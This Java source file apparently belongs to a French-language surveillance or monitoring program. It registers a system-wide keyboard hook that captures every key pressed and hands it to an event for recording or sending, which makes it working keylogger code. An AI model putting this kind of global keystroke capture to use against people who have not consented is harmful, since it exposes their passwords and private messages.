package Model.Watcher;

import java.util.logging.LogManager;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import Controller.Main;

public class KeyListenerWatcher extends Watcher 
{
	static String TYPE = "KEYBOARD";

	public KeyListenerWatcher() 
	{
		super(TYPE);
	}

	public class GlobalKeyListener implements NativeKeyListener 
	{
		public void nativeKeyPressed(NativeKeyEvent e) {
			//System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
			String information = "Touche : " + NativeKeyEvent.getKeyText(e.getKeyCode());
			createDataBeforeSendEvent(information, "normal");

		}

		public void nativeKeyReleased(NativeKeyEvent e) {
			//	System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		}

		public void nativeKeyTyped(NativeKeyEvent e) {
			//	System.out.println("Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		}
	}

	public void run()
	{
		try {
			//Boucle
			GlobalScreen.registerNativeHook();

			if (Main.surveillanceEnCours == false)
				GlobalScreen.unregisterNativeHook();
		}
		catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}

		GlobalScreen.addNativeKeyListener(new GlobalKeyListener());
		LogManager.getLogManager().reset();
	}
}
